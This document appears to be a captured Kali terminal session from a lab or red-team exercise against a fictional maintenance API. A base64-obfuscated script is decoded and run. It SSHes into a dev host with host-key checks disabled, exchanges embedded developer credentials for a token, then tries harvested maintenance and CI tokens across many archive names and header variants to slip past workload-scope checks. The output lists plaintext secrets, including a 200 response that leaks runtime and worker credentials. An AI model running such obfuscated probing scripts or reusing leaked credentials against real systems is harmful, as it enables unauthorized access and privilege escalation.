@@ -1,0 +1,215 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r31.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpSQz0iZmtfbWFpbnRlbmFuY2VfcnVudGltZV8zZ0lQM2o4dzZmaGtCU3F2N0o1eGxsT3JEVmEyS3ppZyIKV0M9ImZrX2NpX21haW50ZW5hbmNlX25VN1YzRE9ucTdrcHlBd3A0NmNWNTBtTzhmcXR4SFNKIgpnKCl7IG49IiQxIjsgc2hpZnQ7IGVjaG8gIiMjIyMjICRuIjsgY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJEAiIHwgaGVhZCAtYyAxNTAwOyBlY2hvOyB9CmVjaG8gIiMjIyMjIyMjIyMgQVJDSElWRSBOQU1FIFNDT1BFIE9SQUNMRSAoQmVhcmVyIFdDKSIKZm9yIGEgaW4gRklFTEQtQ1JSLTIwMjYtMDkgQ1JSLU9HMiBFWFAtMjg0MSBleHAtMjg0MSBzdXBwb3J0LWNhc2UtaGlzdG9yeSBTVVBQT1JULUNBU0UtSElTVE9SWSBmaWVsZGtlc3QtZXhwb3J0cyBmaWVsZGxpbmstZXhwb3J0cyBNQUlOVC1GTEstMDEgU0NIRUQtMjg0MSBzY2hlZC0yODQxIGZpZWxkbGluay1tYWludGVuYW5jZSBtYWludGVuYW5jZSBzdXBwb3J0IGV4cG9ydCBleHBvcnRzIGZpZWxka2VzdCBzdXBwb3J0LWNhc2U7IGRvCiBnICIkYSIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiICIkQi9hcGkvbWFpbnRlbmFuY2UvJGEiCmRvbmUKZWNobyAiIyMjIyMjIyMjIyBBVFRFU1RBVElPTiBDT01CTyAoQmVhcmVyIFdDICsgUkMgYXR0ZXN0YXRpb24pIgpmb3IgYSBpbiBGSUVMRC1DUlItMjAyNi0wOSBDUlItT0cyIEVYUC0yODQxIGZpZWxka2VzdC1leHBvcnRzOyBkbwogZyAiJGEgUkMtYXR0ZXN0IiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkUkMiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgIiRCL2FwaS9tYWludGVuYW5jZS8kYSIKIGcgIiRhIFJDK1dDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkV0M6JFJDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiICIkQi9hcGkvbWFpbnRlbmFuY2UvJGEiCmRvbmUKZWNobyAiIyMjIyMjIyMjIyBBdXRob3JpemF0aW9uIHZhcmlhbnRzIHdpdGggV0MgYXMgYXR0ZXN0YXRpb24gKyBSQyBiZWFyZXIiCmZvciBhIGluIEZJRUxELUNSUi0yMDI2LTA5IENSUi1PRzI7IGRvCiBnICIkYSBSQyBiZWFyZXIsIFdDIGF0dGVzdCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkUkMiIC1IICJYLVNjaGVkdWxlci1BdHRlc3RhdGlvbjogJFdDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiICIkQi9hcGkvbWFpbnRlbmFuY2UvJGEiCiBnICIkYSBSQyBiZWFyZXIsIFdDIHgtd29ya2VyIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRSQyIgLUggIlgtTWFpbnRlbmFuY2UtV29ya2VyOiAkV0MiICIkQi9hcGkvbWFpbnRlbmFuY2UvJGEiCiBnICIkYSBXQyBiZWFyZXIsIHdvcmtsb2FkIGF0dHIiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiIC1IICJYLVdvcmtsb2FkLUlkOiBNQUlOVC1GTEstMDEiIC1IICJYLVNjaGVkdWxlcjogZmllbGRrZXN0LXNjaGVkdWxlciIgLUggIlgtTWFuYWdlbWVudC1DYWxsZXI6IHN2Yy1maWVsZGtlc3QtcnVubmVyIiAiJEIvYXBpL21haW50ZW5hbmNlLyRhIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgV09SS0VSIENSRUQgRk9STUFUUyBvbiAvYXBpL21haW50ZW5hbmNlIChyZWNvcmQpIHRvIGxlYXJuIgpmb3IgQSBpbiAiQmVhcmVyICRXQyIgIldvcmtlciAkV0MiICJNYWludGVuYW5jZSAkV0MiICJTY2hlZHVsZXIgJFdDIjsgZG8KIGcgImF1dGg9JEEiIC1IICJBdXRob3JpemF0aW9uOiAkQSIgIiRCL2FwaS9tYWludGVuYW5jZSIKZG9uZQpmb3IgSCBpbiAiWC1NYWludGVuYW5jZS1Xb3JrZXIiICJYLVdvcmtlci1DcmVkZW50aWFsIiAiWC1NYWludGVuYW5jZS1Ub2tlbiIgIlgtV29ya2xvYWQtVG9rZW4iOyBkbwogZyAiJEggV0MiIC1IICIkSDogJFdDIiAiJEIvYXBpL21haW50ZW5hbmNlIgpkb25lCmVjaG8gRE9ORV9SMzEKUlNICmVjaG8gRklOSVNIRUQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r31.sh; bash /tmp/k14_r31.sh; echo DONEMARK_1795208594584$((6*7))
+########## ARCHIVE NAME SCOPE ORACLE (Bearer WC)
+##### FIELD-CRR-2026-09
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### CRR-OG2
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### EXP-2841
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### exp-2841
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### support-case-history
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### SUPPORT-CASE-HISTORY
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldkest-exports
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldlink-exports
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### MAINT-FLK-01
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### SCHED-2841
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### sched-2841
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldlink-maintenance
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### maintenance
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### support
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### export
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### exports
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldkest
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### support-case
+{"error":"out_of_scope_workload"}
+
+[403]
+
+########## ATTESTATION COMBO (Bearer WC + RC attestation)
+##### FIELD-CRR-2026-09 RC-attest
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### FIELD-CRR-2026-09 RC+WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### CRR-OG2 RC-attest
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### CRR-OG2 RC+WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### EXP-2841 RC-attest
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### EXP-2841 RC+WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldkest-exports RC-attest
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### fieldkest-exports RC+WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+########## Authorization variants with WC as attestation + RC bearer
+##### FIELD-CRR-2026-09 RC bearer, WC attest
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### FIELD-CRR-2026-09 RC bearer, WC x-worker
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### FIELD-CRR-2026-09 WC bearer, workload attr
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### CRR-OG2 RC bearer, WC attest
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### CRR-OG2 RC bearer, WC x-worker
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### CRR-OG2 WC bearer, workload attr
+{"error":"out_of_scope_workload"}
+
+[403]
+
+########## WORKER CRED FORMATS on /api/maintenance (record) to learn
+##### auth=Bearer fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ
+{"archive_asset":"CRR-OG2","field_archive":"FIELD-CRR-2026-09","policy_id":"fieldlink-maintenance","runtime_credential":"fk_maintenance_runtime_3gIP3j8w6fhkBSqv7J5xllOrDVa2Kzig","worker_credential":"fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ","workload_class":"maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### auth=Worker fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ
+{"error":"authentication_required"}
+
+[401]
+
+##### auth=Maintenance fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ
+{"error":"authentication_required"}
+
+[401]
+
+##### auth=Scheduler fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ
+{"error":"authentication_required"}
+
+[401]
+
+##### X-Maintenance-Worker WC
+{"error":"authentication_required"}
+
+[401]
+
+##### X-Worker-Credential WC
+{"error":"authentication_required"}
+
+[401]
+
+##### X-Maintenance-Token WC
+{"error":"authentication_required"}
+
+[401]
+
+##### X-Workload-Token WC
+{"error":"authentication_required"}
+
+[401]
+
+DONE_R31
+FINISHED
